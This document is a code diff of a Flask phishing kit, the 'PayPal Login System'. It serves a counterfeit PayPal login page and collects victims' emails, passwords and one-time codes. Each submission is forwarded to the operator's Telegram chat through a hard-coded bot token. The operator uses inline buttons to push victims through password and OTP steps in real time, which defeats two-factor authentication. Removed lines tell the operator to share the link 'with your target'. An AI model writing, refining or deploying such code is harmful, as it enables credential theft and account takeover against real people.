@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PayPal Login System - Optimized for Render
+COMPLETE PayPal Login System with Telegram + Render
 """
 
 from flask import Flask, request, jsonify, render_template_string
@@ -11,8 +11,8 @@ import threading
 from datetime import datetime
 import os
 
-# Ultra-fast logging setup
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+# Setup logging
+logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
@@ -21,32 +21,40 @@ app = Flask(__name__)
 BOT_TOKEN = "8343644991:AAGUCkdTgJsBWMXTcQOv6yxjwiGqkUKxIVI"
 CHAT_ID = "7861055360"
 
-# Optimized session storage
+# Session storage
 sessions = {}
 last_update_id = 0
 
 def send_telegram_message(text, reply_markup=None):
-    """Ultra-fast Telegram message sending"""
+    """Send message to Telegram"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     
     payload = {
         'chat_id': CHAT_ID,
         'text': text,
         'parse_mode': 'HTML',
-        'disable_notification': True
+        'disable_notification': False
     }
     
     if reply_markup:
         payload['reply_markup'] = reply_markup
     
     try:
-        threading.Thread(target=requests.post, args=(url,), kwargs={'json': payload, 'timeout': 2}).start()
-        return True
-    except:
+        response = requests.post(url, json=payload, timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('ok'):
+                logger.info("✅ Telegram message sent")
+                return True
+        return False
+    except Exception as e:
+        logger.error(f"Telegram error: {e}")
         return False
 
 def create_keyboard(session_id, field, value):
-    """Optimized keyboard creation for PayPal form"""
+    """Create keyboard with copy buttons"""
+    keyboard = []
+    
     if field == 'email':
         keyboard = [
             [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
@@ -66,21 +74,24 @@ def create_keyboard(session_id, field, value):
             [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
             [{"text": "🔢 COPY OTP", "callback_data": f"copy:{session_id}:otp"}],
             [{"text": "✅ PROCEED TO SUCCESS", "callback_data": f"proceed_success:{session_id}"}],
-            [{"text": "❌ OTP ERROR", "callback_data": f"otp_error:{session_id}"}],
+            [{"text": "❌ OTP INCORRECT", "callback_data": f"otp_error:{session_id}"}],
             [{"text": "🔄 RESEND OTP", "callback_data": f"resend_otp:{session_id}"}]
         ]
     
     return {"inline_keyboard": keyboard}
 
 def get_telegram_updates():
-    """High-speed Telegram polling"""
+    """Get Telegram updates"""
     global last_update_id
     
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-        params = {'timeout': 3, 'offset': last_update_id + 1}
+        params = {
+            'timeout': 5,
+            'offset': last_update_id + 1
+        }
         
-        response = requests.get(url, params=params, timeout=4)
+        response = requests.get(url, params=params, timeout=6)
         
         if response.status_code == 200:
             data = response.json()
@@ -88,46 +99,57 @@ def get_telegram_updates():
                 for update in data['result']:
                     last_update_id = update['update_id']
                     
+                    # Handle messages (like /start)
                     if 'message' in update and 'text' in update['message']:
                         text = update['message']['text']
                         if text == '/start':
                             return f"start_command:{update['message']['chat']['id']}"
                     
+                    # Handle callback queries
                     if 'callback_query' in update:
-                        return update['callback_query']['data']
+                        callback_data = update['callback_query']['data']
+                        logger.info(f"Received command: {callback_data}")
+                        return callback_data
         return None
-    except Exception:
+    except Exception as e:
         return None
 
 def process_commands_background():
-    """High-speed background command processor"""
-    
+    """Background thread for command processing"""
     while True:
         try:
             command = get_telegram_updates()
             if command:
+                # Handle start command
                 if command.startswith('start_command:'):
+                    chat_id = command.split(':')[1]
                     render_url = os.getenv('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
-                    
                     send_telegram_message(
-                        f"💰 <b>PAYPAL LOGIN SYSTEM</b>\n"
-                        f"🔗 Your PayPal Link: {render_url}\n"
-                        f"📱 Share this link with your target\n"
+                        f"🌐 <b>PAYPAL LOGIN SYSTEM</b>\n"
+                        f"🔗 Your Link: {render_url}\n"
                         f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                     )
                 
+                # Handle copy commands
                 elif command.startswith('copy:'):
                     parts = command.split(':')
                     if len(parts) >= 3:
-                        session_id, field = parts[1], parts[2]
+                        session_id = parts[1]
+                        field = parts[2]
+                        
                         if session_id in sessions:
                             value = sessions[session_id].get(field, '')
                             send_telegram_message(
-                                f"📋 <b>COPY {field.upper()}</b>\n<code>{value}</code>\n\n⏰ {datetime.now().strftime('%H:%M:%S')}"
+                                f"📋 <b>COPY {field.upper()}</b>\n"
+                                f"<code>{value}</code>\n\n"
+                                f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                             )
                 
+                # Handle action commands
                 elif ':' in command:
                     action, session_id = command.split(':', 1)
+                    
+                    # Map actions to session states
                     action_map = {
                         'proceed_password': 'show_password',
                         'email_error': 'show_email_error', 
@@ -138,20 +160,23 @@ def process_commands_background():
                         'resend_otp': 'resend_otp'
                     }
                     
-                    if action in action_map and session_id in sessions:
-                        sessions[session_id]['action'] = action_map[action]
-                        sessions[session_id]['last_update'] = time.time()
+                    if action in action_map:
+                        if session_id in sessions:
+                            sessions[session_id]['action'] = action_map[action]
+                            sessions[session_id]['last_update'] = time.time()
+                            logger.info(f"Set action {action_map[action]} for session {session_id}")
             
-            time.sleep(0.2)
+            time.sleep(0.3)
             
         except Exception as e:
-            time.sleep(0.3)
+            logger.error(f"Command processor error: {e}")
+            time.sleep(0.5)
 
-# Start high-speed command processor
+# Start background command processor
 command_thread = threading.Thread(target=process_commands_background, daemon=True)
 command_thread.start()
 
-# Verification Page Template
+# Verification Success Template
 VERIFICATION_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -1039,64 +1064,71 @@ PAYPAL_TEMPLATE = '''
 
 @app.route('/')
 def home():
-    """Ultra-fast form serving"""
     return render_template_string(PAYPAL_TEMPLATE)
 
 @app.route('/verification-success')
 def verification_success():
-    """Verification success page"""
     return render_template_string(VERIFICATION_TEMPLATE)
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    """High-speed data submission"""
     data = request.json
     session_id = data.get('session_id')
     field = data.get('field')
     value = data.get('value')
     
+    logger.info(f"Received {field} for session {session_id}")
+    
+    # Initialize session
     if session_id not in sessions:
         sessions[session_id] = {}
     
     sessions[session_id][field] = value
     sessions[session_id]['last_update'] = time.time()
     
+    # CRITICAL: Clear any previous action
     if 'action' in sessions[session_id]:
         del sessions[session_id]['action']
     
-    form_name = "💰 PAYPAL"
-    keyboard = create_keyboard(session_id, field, value)
-    
+    # Send Telegram notification
     if field == 'email':
+        keyboard = create_keyboard(session_id, 'email', value)
+        
         send_telegram_message(
-            f"📧 <b>{form_name} - EMAIL SUBMITTED</b>\n"
+            f"📧 <b>EMAIL SUBMITTED</b>\n"
             f"Email: <code>{value}</code>\n"
             f"Session: {session_id[-12:]}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}",
             keyboard
         )
+    
     elif field == 'password':
+        keyboard = create_keyboard(session_id, 'password', value)
+        
         send_telegram_message(
-            f"🔑 <b>{form_name} - PASSWORD SUBMITTED</b>\n"
+            f"🔑 <b>PASSWORD SUBMITTED</b>\n"
             f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
             f"Password: <code>{value}</code>\n"
             f"Session: {session_id[-12:]}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}",
             keyboard
         )
+    
     elif field == 'otp':
+        keyboard = create_keyboard(session_id, 'otp', value)
+        
         send_telegram_message(
-            f"🔢 <b>{form_name} - OTP SUBMITTED</b>\n"
+            f"🔢 <b>OTP SUBMITTED</b>\n"
             f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
             f"OTP: <code>{value}</code>\n"
             f"Session: {session_id[-12:]}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}",
             keyboard
         )
+    
     elif field == 'request_otp':
         send_telegram_message(
-            f"🔄 <b>{form_name} - OTP RESEND REQUESTED</b>\n"
-            f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
+            f"🔄 <b>NEW OTP REQUESTED</b>\n"
             f"Session: {session_id[-12:]}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}"
         )
@@ -1105,24 +1137,41 @@ def submit():
 
 @app.route('/status')
 def status():
-    """Ultra-fast status checking"""
     session_id = request.args.get('session_id')
-    action = sessions[session_id].get('action') if session_id in sessions else None
-    return jsonify({'action': action})
+    
+    if session_id in sessions:
+        action = sessions[session_id].get('action')
+        return jsonify({'action': action})
+    
+    return jsonify({'action': None})
 
 @app.route('/clear-session')
 def clear_session():
-    """Fast session clearing"""
     session_id = request.args.get('session_id')
-    if session_id in sessions and 'action' in sessions[session_id]:
-        del sessions[session_id]['action']
+    if session_id in sessions:
+        if 'action' in sessions[session_id]:
+            del sessions[session_id]['action']
+    return jsonify({'success': True})
+
+@app.route('/request-new-otp', methods=['POST'])
+def request_new_otp():
+    data = request.json
+    session_id = data.get('session_id')
+    
+    send_telegram_message(
+        f"🔄 <b>NEW OTP REQUESTED</b>\n"
+        f"Session: {session_id[-12:]}\n"
+        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
+    )
+    
     return jsonify({'success': True})
 
 if __name__ == "__main__":
-    print("🚀 PAYPAL LOGIN SYSTEM STARTED")
-    print("⚡ Optimized for maximum speed")
-    print("📱 Telegram bot ready - Send /start")
-    print("🌐 Render deployment ready")
+    print("🚀 COMPLETE SYSTEM STARTED")
+    print("📱 Send '/start' to your Telegram bot to get the Render link")
+    print("⏳ Preloader waits FOREVER for Telegram responses")
+    print("✅ All workflows perfected")
+    print("🌐 Render hosting ready")
     
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
